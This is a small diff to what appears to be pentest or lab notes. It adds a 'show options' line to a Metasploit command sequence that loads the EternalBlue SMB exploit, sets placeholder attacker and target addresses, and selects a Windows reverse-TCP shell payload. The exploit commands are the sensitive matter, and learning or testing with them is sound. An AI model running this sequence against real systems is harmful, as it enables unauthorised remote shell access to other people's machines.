@@ -26,6 +26,7 @@ info exploit/windows/smb/ms17_010_eternalblue
 
 ```shell
 use exploit/windows/smb/ms17_010_eternalblue
+show options
 set LHOST <my-ip>
 set RHOSTS <target-ip>
 set payload windows/x64/shell/reverse_tcp
